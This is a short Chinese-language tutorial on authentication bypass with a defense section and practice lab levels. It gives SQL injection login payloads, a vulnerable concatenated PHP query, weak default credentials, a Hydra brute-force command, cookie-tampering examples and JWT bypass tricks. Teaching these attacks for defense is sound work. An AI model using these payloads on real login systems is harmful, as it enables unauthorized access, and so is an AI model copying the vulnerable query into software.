# 认证绕过漏洞

## 概述

认证绕过（Authentication Bypass）指攻击者绕过登录验证，以未授权身份访问系统。

## 常见认证绕过方式

### 1. SQL 注入绕过登录

```php
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Payload：

```
username: admin' --
password: 任意值
```

等价于：`SELECT * FROM users WHERE username='admin' --' AND password='...'`

### 2. 万能密码

```
username: admin' or '1'='1
password: 任意值
```

### 3. 弱口令

常见弱口令：

- admin / admin
- admin / 123456
- root / root
- test / test

### 4. 暴力破解

使用字典暴力破解密码：

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### 5. Cookie 篡改

```
Cookie: role=user  →  Cookie: role=admin
Cookie: auth=0     →  Cookie: auth=1
```

### 6. JWT 绕过

- 修改算法为 none
- 使用弱密钥
- 修改 payload 中的角色

## 防御

1. 使用参数化查询防止 SQL 注入
2. 使用强密码策略
3. 实施账户锁定机制
4. 使用安全的 Session 管理
5. 对 JWT 使用强密钥和正确算法

## 靶场

- Easy: 表单爆破
- Simple: 验证码绕过
- Hard: Token 防爆破绕过
- Hell: WAF 绕过 + 分布式爆破
